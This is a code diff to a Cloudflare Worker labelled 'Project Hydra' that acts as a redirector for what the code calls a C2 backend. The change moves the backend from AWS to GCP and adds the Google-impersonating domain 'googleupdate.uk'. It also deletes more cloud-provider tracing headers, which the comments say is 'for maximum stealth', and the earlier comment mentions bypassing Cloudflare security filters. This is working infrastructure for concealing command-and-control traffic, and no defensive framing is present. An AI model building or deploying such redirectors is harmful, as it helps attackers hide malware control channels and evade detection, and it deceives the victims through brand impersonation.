@@ -1,13 +1,14 @@
 /**
  * Project Hydra: Clean Edge Redirector (Cloudflare Worker)
- * Safely forwards traffic to CloudFront while bypassing Cloudflare 1016 security filters.
+ * Safely forwards traffic to GCP Load Balancer while maintaining stealth.
+ * Domain: googleupdate.uk
  */
 export default {
   async fetch(request, env) {
     const originalUrl = new URL(request.url);
     const targetUrl = new URL(env.C2_BACKEND);
 
-    // Copy the path and query parameters to the AWS destination
+    // Copy the path and query parameters to the GCP destination
     targetUrl.pathname = originalUrl.pathname;
     targetUrl.search = originalUrl.search;
 
@@ -35,12 +36,15 @@ export default {
       const response = await fetch(proxyRequest);
 
       const newResponseHeaders = new Headers(response.headers);
-      // Scrub AWS and CloudFront tracing headers for maximum stealth
+      // Scrub GCP and Google tracing headers for maximum stealth
       newResponseHeaders.delete("Server");
-      newResponseHeaders.delete("X-Cache");
+      newResponseHeaders.delete("X-Cloud-Trace-Context");
+      newResponseHeaders.delete("X-GUploader-UploadID");
+      newResponseHeaders.delete("X-Goog-Generation");
+      newResponseHeaders.delete("X-Goog-Metageneration");
+      newResponseHeaders.delete("X-Goog-Hash");
       newResponseHeaders.delete("Via");
-      newResponseHeaders.delete("X-Amz-Cf-Pop");
-      newResponseHeaders.delete("X-Amz-Cf-Id");
+      newResponseHeaders.delete("Alt-Svc");
 
       return new Response(response.body, {
         status: response.status,
